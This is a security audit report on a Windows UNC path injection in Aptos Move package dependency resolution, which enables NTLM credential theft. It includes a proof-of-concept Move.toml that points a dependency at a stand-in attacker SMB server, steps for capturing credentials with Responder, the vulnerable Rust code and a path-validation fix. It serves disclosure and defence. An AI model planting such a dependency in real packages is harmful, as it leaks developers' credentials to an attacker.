# Audit Report

## Title
Windows UNC Path Injection in Move Package Dependency Resolution Leading to NTLM Credential Theft

## Summary
The Move package compilation system does not validate local dependency paths in `Move.toml` manifests, allowing attackers to specify UNC paths (e.g., `\\attacker-server\share`) that trigger automatic NTLM authentication on Windows systems when developers compile malicious packages.

## Finding Description
When the Move package resolver processes dependencies declared in `Move.toml` files, it directly uses the `local` path without validation. An attacker can create a malicious Move package with a dependency pointing to a UNC path:

```toml
[dependencies]
MaliciousFramework = { local = "\\\\attacker-server\\share\\package" }
```

The vulnerability occurs in the dependency resolution code: [1](#0-0) 

The parser converts the local path string to a PathBuf without any validation. [2](#0-1) 

During resolution, the code performs `root_path.push(&dep.local)` followed by a file system read. On Windows, Rust's `PathBuf::push()` replaces the current path when given an absolute path (including UNC paths). The subsequent `fs::read_to_string()` call triggers Windows to attempt network authentication to the UNC share, automatically sending NTLM credentials to the attacker's server.

**Attack Flow:**
1. Attacker creates malicious Move package with UNC path dependency
2. Developer downloads package and runs `aptos move compile`
3. Compilation process calls `BuiltPackage::build()` → `prepare_resolution_graph()` → `resolution_graph_for_package()` [3](#0-2) 

4. Resolution graph processing calls `parse_package_manifest()` which accesses the UNC path
5. Windows sends NTLM credentials to attacker's server
6. Attacker captures credentials for relay attacks or offline cracking [4](#0-3) 

The `CompilePackage` CLI command directly exposes this vulnerability to end users.

## Impact Explanation
**Assessment: Does Not Meet Blockchain Bug Bounty Severity Threshold**

While this is a legitimate security vulnerability enabling NTLM credential theft, it does NOT meet the Aptos bug bounty criteria which focus on blockchain security:

- **Not Critical**: No loss of funds, consensus violations, or network partitions
- **Not High**: No validator node impact or API crashes  
- **Not Medium**: No funds loss or blockchain state inconsistencies
- **Closest Match: Low Severity** - Information disclosure affecting developer workstations only

This vulnerability affects the **developer tooling** layer, not the blockchain itself. It does not impact:
- Validator nodes or consensus
- On-chain state or transactions
- Network availability or liveness
- Funds or assets

Additionally, it falls under the exclusions: "Social engineering, phishing, or key theft" - as it requires social engineering to distribute the malicious package and results in credential theft.

## Likelihood Explanation
**High likelihood** for targeted attacks against developers in Windows environments working with untrusted Move packages. However, the impact is limited to developer workstations and does not affect the blockchain infrastructure.

## Recommendation
Implement strict path validation in the manifest parser to reject absolute paths, UNC paths, and paths containing traversal sequences:

```rust
fn validate_local_path(path: &Path) -> Result<()> {
    if path.is_absolute() {
        bail!("Absolute paths not allowed in local dependencies: {}", path.display());
    }
    
    // On Windows, check for UNC paths
    #[cfg(windows)]
    if path.to_string_lossy().starts_with(r"\\") {
        bail!("UNC paths not allowed in local dependencies: {}", path.display());
    }
    
    // Check for path traversal outside package root
    for component in path.components() {
        if matches!(component, std::path::Component::ParentDir) {
            bail!("Path traversal not allowed in local dependencies: {}", path.display());
        }
    }
    
    Ok(())
}
```

Apply validation in `parse_dependency()` before using the path.

## Proof of Concept
**Malicious Move.toml:**
```toml
[package]
name = "MaliciousPackage"
version = "0.0.0"

[dependencies]
Exploit = { local = "\\\\attacker-controlled-server\\share\\package" }

[addresses]
std = "0x1"
```

**Steps:**
1. Create package with above Move.toml
2. On Windows, run: `aptos move compile`
3. Monitor network traffic - observe SMB connection attempt with NTLM authentication
4. Capture credentials on attacker's SMB server using Responder or similar tool

---

**Note**: While this is a real security vulnerability in the Move package tooling, it does not meet the severity threshold for the Aptos blockchain bug bounty program, which focuses on consensus, validator, state management, and on-chain security issues rather than developer tool vulnerabilities.

### Citations

**File:** third_party/move/tools/move-package/src/source_package/manifest_parser.rs (L342-346)
```rust
                (Some(local), None, None) => {
                    let local_str = local
                        .as_str()
                        .ok_or_else(|| format_err!("Local source path not a string"))?;
                    let local_path = PathBuf::from(local_str);
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L499-516)
```rust
    fn parse_package_manifest(
        dep: &Dependency,
        dep_name: &PackageName,
        mut root_path: PathBuf,
    ) -> Result<(SourceManifest, PathBuf)> {
        root_path.push(&dep.local);
        match fs::read_to_string(root_path.join(SourcePackageLayout::Manifest.path())) {
            Ok(contents) => {
                let source_package: SourceManifest =
                    parse_move_manifest_string(contents).and_then(parse_source_manifest)?;
                Ok((source_package, root_path))
            },
            Err(_) => Err(anyhow::format_err!(
                "Unable to find package manifest for '{}' at {:?}",
                dep_name,
                SourcePackageLayout::Manifest.path().join(root_path),
            )),
        }
```

**File:** aptos-move/framework/src/built_package.rs (L275-281)
```rust
    pub fn prepare_resolution_graph(
        package_path: PathBuf,
        build_config: BuildConfig,
    ) -> anyhow::Result<ResolvedGraph> {
        eprintln!("Compiling, may take a little while to download git dependencies...");
        build_config.resolution_graph_for_package(&package_path, &mut stderr())
    }
```

**File:** crates/aptos/src/move_tool/mod.rs (L426-441)
```rust
    async fn execute(self) -> CliTypedResult<Vec<String>> {
        let build_options = BuildOptions {
            install_dir: self.move_options.output_dir.clone(),
            ..self
                .included_artifacts_args
                .included_artifacts
                .build_options(&self.move_options)?
        };
        let package_path = self.move_options.get_package_path()?;
        if self.fetch_deps_only {
            let config = BuiltPackage::create_build_config(&build_options)?;
            BuiltPackage::prepare_resolution_graph(package_path, config)?;
            return Ok(vec![]);
        }
        let pack = BuiltPackage::build(self.move_options.get_package_path()?, build_options)
            .map_err(|e| CliError::MoveCompilationError(format!("{:#}", e)))?;
```
